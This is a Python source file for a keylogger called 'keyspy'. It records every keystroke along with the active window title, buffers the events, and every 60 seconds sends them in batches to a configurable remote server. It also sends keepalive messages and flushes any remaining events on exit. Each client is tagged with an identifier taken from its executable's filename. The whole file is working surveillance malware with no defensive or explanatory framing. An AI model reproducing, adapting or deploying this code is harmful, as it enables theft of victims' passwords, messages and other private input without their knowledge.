from datetime import datetime
from pynput import keyboard
import win32gui
import json
import threading
import requests
import atexit
import os
import sys

send_time = 60
event_buffer = []
buffer_lock = threading.Lock()

def get_active_window():
    hwnd = win32gui.GetForegroundWindow()
    title = win32gui.GetWindowText(hwnd)
    return title.split(" - ")[-1] if title else "Unknown"


SERVER = os.getenv("KEYSPY_SERVER_URL", "http://127.0.0.1:8000")

def get_uuid():
    filename = os.path.splitext(os.path.basename(sys.executable if getattr(sys, 'frozen', False) else __file__))[0]
    parts = filename.split('_', 1)
    if len(parts) == 2:
        return parts[1]
    return filename

USER_UUID = get_uuid()
HEADERS = {"X-User-UUID": USER_UUID}


def send_key_events(key_events):
    try:
        response = requests.post(f"{SERVER}/api/key_events", json={"key_events": key_events}, headers=HEADERS)
        return response.status_code == 200
    except requests.exceptions.ConnectionError:
        print("[ERROR] server unreachable — key events not sent")
        return False


def send_keepalive():
    try:
        response = requests.post(f"{SERVER}/api/keepalive", headers=HEADERS)
        return response.status_code == 200
    except requests.exceptions.ConnectionError:
        print("[ERROR] server unreachable — keepalive failed")
        return False


def sender_loop():
    timer = threading.Event()
    while not timer.wait(send_time):
        with buffer_lock:
            batch = event_buffer.copy()
            event_buffer.clear()
        if batch:
            send_key_events(batch)
        else:
            print("[INFO] nothing to send")


def keepalive_loop():
    timer = threading.Event()
    while not timer.wait(send_time):
        send_keepalive()


def on_press(key):
    try:
        char = key.char
    except AttributeError:
        char = str(key).replace("Key.", "")

    key_event = {
        "timestamp": datetime.now().strftime("%H:%M:%S.%f")[:-3],
        "key": char,
        "app": get_active_window(),
    }
    with buffer_lock:
        event_buffer.append(key_event)
    print(json.dumps(key_event))


def flush_on_exit():
    with buffer_lock:
        batch = event_buffer.copy()
        event_buffer.clear()
    if batch:
        print(f"[EXIT] flushing {len(batch)} buffered event(s)...")
        send_key_events(batch)


def main():
    print("keyspy started. press CTRL+C to stop.\n")

    atexit.register(flush_on_exit)
    threading.Thread(target=sender_loop, daemon=True).start()
    threading.Thread(target=keepalive_loop, daemon=True).start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()
